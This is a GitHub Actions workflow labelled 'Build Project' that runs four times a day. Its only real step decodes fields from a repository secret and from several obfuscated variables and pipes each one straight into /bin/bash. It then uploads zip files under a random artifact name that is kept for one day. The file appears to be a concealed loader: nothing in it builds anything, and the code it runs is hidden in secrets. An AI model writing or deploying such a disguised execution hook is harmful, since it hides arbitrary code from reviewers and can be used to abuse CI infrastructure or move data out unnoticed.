name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '37 3,9,15,21 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          c016: ${{ secrets.c016 }}
        run: |
          printf '%s' "$c016" | jq -r .ltzyq6 | /bin/bash
          printf '%s' "$pogco96427" | jq -r .elb7430 | /bin/bash
          echo $o9 | jq -r .swwnm98 | /bin/bash
          printf '%s' "$cu9" | jq -r .t0358 | /bin/bash
          echo $va047 | jq -r .ix27 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: zXAKxy48
          path: "*.zip"
          retention-days: 1
